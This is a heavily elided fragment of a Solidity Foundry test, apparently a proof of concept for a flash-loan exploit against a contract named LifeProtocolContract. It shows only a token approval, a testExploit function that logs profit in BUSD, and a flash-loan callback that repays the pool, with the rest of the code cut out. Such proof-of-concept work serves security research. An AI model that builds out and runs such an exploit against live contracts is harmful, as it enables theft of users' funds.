...
address constant bsud = 0x55d398326f99059fF775485246999027B3197955;
...
contract t2 is Test {
    ...
    function setUp() public {
        ...
        IFS(bsud).approve(LifeProtocolContract, quoteAmount);
    ...
    function testExploit() public {
        ...
        console2.log("Profit:", IFS(bsud).balanceOf(address(this)) / 1e18, 'BUSD');
    }
    ...
    function DPPFlashLoanCall(
        ...
        IFS(bsud).transfer(dpp, quoteAmount);
    }
}
